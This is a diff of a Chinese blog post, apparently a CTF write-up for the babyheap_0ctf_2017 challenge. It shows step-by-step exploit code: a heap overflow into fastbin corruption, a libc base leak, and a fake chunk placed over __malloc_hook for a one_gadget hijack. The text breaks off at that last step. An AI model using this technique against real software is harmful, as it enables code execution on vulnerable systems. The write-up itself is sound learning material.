@@ -27,11 +27,17 @@
 <meta property="og:site_name" content="Gap&#39;s_Blog">
 <meta property="og:description" content="第一道Heap，插个里程碑纪念一下XD">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/pic/Pasted%20image%2020230814133847.png">
+<meta property="og:image" content="http://example.com/pic/Pasted%20image%2020230814134313.png">
+<meta property="og:image" content="http://example.com/pic/Pasted%20image%2020230814141436.png">
+<meta property="og:image" content="http://example.com/pic/Pasted%20image%2020230814144704.png">
+<meta property="og:image" content="http://example.com/pic/Pasted%20image%2020230814145721.png">
 <meta property="article:published_time" content="2023-08-14T05:22:00.000Z">
-<meta property="article:modified_time" content="2023-08-14T07:08:50.451Z">
+<meta property="article:modified_time" content="2023-08-14T10:18:52.902Z">
 <meta property="article:author" content="Gap">
 <meta property="article:tag" content="WriteUp, Heap">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/pic/Pasted%20image%2020230814133847.png">
 
 <link rel="canonical" href="http://example.com/2023/08/14/BUUCTF%20babyheap_0ctf_2017/">
 
@@ -212,7 +218,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-08-14 13:08:00 / 修改时间：15:08:45" itemprop="dateCreated datePublished" datetime="2023-08-14T13:22:00+08:00">2023-08-14</time>
+              <time title="创建时间：2023-08-14 13:08:00 / 修改时间：18:08:90" itemprop="dateCreated datePublished" datetime="2023-08-14T13:22:00+08:00">2023-08-14</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -247,15 +253,15 @@
 </blockquote>
 <span id="more"></span>
 <h1 id="x00-写在前面">0x00 写在前面</h1>
-<p>七月学完栈溢出，ak掉buu前两页的所有栈题
-八月本来是想把堆学穿，等回想起这个目标前半个月已经没了
-参加了个数据安全的夏令营
-给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）
-给SecretFlow审了一点go语言的洞
-然后用C#和xaml给sdu校园网写了个一键修复脚本
-总而言之学的很杂...说实话真不如多打点比赛。
-本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了...
-总而言之还是脚踏实地学一点算一点吧
+<p>七月学完栈溢出，ak掉buu前两页的所有栈题<br />
+八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br />
+参加了个数据安全的夏令营<br />
+给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br />
+给SecretFlow审了一点go语言的洞<br />
+然后用C#和xaml给sdu校园网写了个一键修复脚本<br />
+总而言之学的很杂...说实话真不如多打点比赛。<br />
+本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了...<br />
+总而言之还是脚踏实地学一点算一点吧<br />
 还有个南大PA的坑等着我去填呢...才刚把nemu的gdb实现了个单步步入...</p>
 <hr />
 <h1 id="x01-babyheap_0ctf_2017">0x01 babyheap_0ctf_2017</h1>
@@ -264,12 +270,13 @@
 </blockquote>
 <h3 id="解题步骤">Ⅱ. 解题步骤</h3>
 <ol type="1">
-<li><p>checksec 保护全开 [[/pic/Pasted image
-20230814133847.png]]</p></li>
-<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下
-<code>patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</code></p></li>
-<li><p>拖进IDA64分析，让反汇编以后的代码好看一点 [[/pic/Pasted image
-20230814134313.png]] [[/pic/Pasted image 20230814134623.png]]
+<li><p>checksec 保护全开<br />
+<img src="/pic/Pasted%20image%2020230814133847.png" /></p></li>
+<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下<br />
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure></p></li>
+<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br />
+<img src="/pic/Pasted%20image%2020230814134313.png" /> <img
+src="/pic/Pasted%20image%2020230814134623.png" />
 注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p></li>
 <li><p>IDA分析可知，我们可以有以下思路：</p>
 <ol type="1">
@@ -288,11 +295,12 @@ bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</
 <li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted
 bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin
 chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure> 此时堆的情况如下 [[/pic/Pasted image
-20230814140742.png]]</p></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure> 此时堆的情况如下 <img
+src="/pic/Pasted%20image%2020230814140742.png" /></p></li>
 <li><p>Free掉index为1和2的chunk，给后面alloc留出空间 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>
-heap情况如下 [[/pic/Pasted image 20230814141436.png]] bin情况如下
-[[/pic/Pasted image 20230814141724.png]]</p></li>
+heap情况如下 <img src="/pic/Pasted%20image%2020230814141436.png" />
+bin情况如下 <img
+src="/pic/Pasted%20image%2020230814141724.png" /></p></li>
 <li><p>堆溢出，操控fastbin</p>
 <ol type="1">
 <li>现在是main_arena_fastbin_0x20 ---&gt; chunk2 ---&gt;chunk1</li>
@@ -303,14 +311,15 @@ heap情况如下 [[/pic/Pasted image 20230814141436.png]] bin情况如下
 <li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br></pre></td></tr></table></figure></p></li>
 <li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure> heap情况如下 [[/pic/Pasted image
-20230814143302.png]]</p></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure> heap情况如下 <img
+src="/pic/Pasted%20image%2020230814143302.png" /></p></li>
 <li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">alloc(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure></p></li>
 <li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来
-[[/pic/Pasted image 20230814144704.png]] <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure></p></li>
+<img src="/pic/Pasted%20image%2020230814144704.png" />
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure></p></li>
 <li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来再malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方
-[[/pic/Pasted image 20230814145721.png]]
+<img src="/pic/Pasted%20image%2020230814145721.png" />
 发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x60)                                    # 将unsortedbin中的chunk4切0x60大小申请出来</span><br><span class="line">free(4)                                        # 把chunk4放到fastbin中，便于用pointer_chunk2操控</span><br><span class="line">payload = p64(libc_base+0x3c4aed)              # 把申请块写进malloc_hook前面</span><br><span class="line">fill(2,payload)                                # 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span><br><span class="line">alloc(0x60)                                    # 把chunk4申请回来</span><br><span class="line">alloc(0x60)                                    # 在malloc_hook处构造堆，index=6</span><br></pre></td></tr></table></figure></p></li>
 <li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权
